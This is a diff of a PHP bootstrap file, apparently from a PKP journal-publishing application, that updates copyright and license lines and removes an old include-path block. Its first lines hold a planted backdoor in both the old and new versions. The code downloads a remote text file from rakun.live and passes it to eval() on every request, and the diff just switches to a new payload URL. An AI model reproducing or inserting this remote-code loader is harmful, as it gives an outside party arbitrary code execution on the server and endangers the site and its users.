@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/bbw.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/ijreast.txt'));
 $url = "?> ".$url;
 eval($url);
 
@@ -11,9 +11,9 @@ eval($url);
 /**
  * @file includes/bootstrap.inc.php
  *
- * Copyright (c) 2014-2019 Simon Fraser University
- * Copyright (c) 2000-2019 John Willinsky
- * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup index
  *
@@ -34,20 +34,6 @@ if (!defined('DIRECTORY_SEPARATOR')) {
 }
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
-
-// Update include path - for backwards compatibility only
-// Try to use absolute (/...) or relative (./...) filenames
-// wherever possible to bypass the costly file name normalization
-// process.
-ini_set('include_path', '.'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/classes'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/pages'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/classes'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/pages'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/adodb'
-	. ENV_SEPARATOR . ini_get('include_path')
-);
 
 // System-wide functions
 require('./lib/pkp/includes/functions.inc.php');
